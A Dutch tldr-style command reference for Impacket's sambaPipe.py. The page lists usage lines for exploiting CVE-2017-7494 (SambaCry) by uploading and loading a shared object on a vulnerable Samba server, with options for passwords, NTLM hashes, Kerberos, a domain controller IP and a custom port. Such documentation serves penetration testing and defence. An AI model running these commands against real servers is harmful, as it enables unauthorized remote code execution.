# sambaPipe.py

> Misbruik CVE-2017-7494 (SambaCry) om een SO-bestand (shared object) te uploaden en laden op een kwetsbare Samba-server om code op afstand uit te voeren.
> Onderdeel van de Impacket suite.
> Meer informatie: <https://github.com/fortra/impacket>.

- Upload een gedeeld objectbestand en laad op een kwetsbare Samba-server:

`sambaPipe.py -so {{pad/naar/bestand.so}} {{domein}}/{{gebruikersnaam}}:{{wachtwoord}}@{{doel}}`

- Authenticeren met NTLM hashes in plaats van een wachtwoord:

`sambaPipe.py -so {{pad/naar/bestand.so}} -hashes {{LM_HASH:NT_HASH}} {{domein}}/{{gebruikersnaam}}:{{wachtwoord}}@{{doel}}`

- Gebruik Kerberos verificatie voor het doel:

`sambaPipe.py -so {{pad/naar/bestand.so}} -k -no-pass {{domein}}/{{gebruikersnaam}}:{{wachtwoord}}@{{doel}}`

- Specificeer een domeincontroller IP voor authenticatie:

`sambaPipe.py -so {{pad/naar/bestand.so}} -dc-ip {{dc_ip}} {{domein}}/{{gebruikersnaam}}:{{wachtwoord}}@{{doel}}`

- Gebruik een aangepaste poort voor de SMB-verbinding:

`sambaPipe.py -so {{pad/naar/bestand.so}} -port {{porrt}} {{domein}}/{{gebruikersnaam}}:{{wachtwoord}}@{{doel}}`
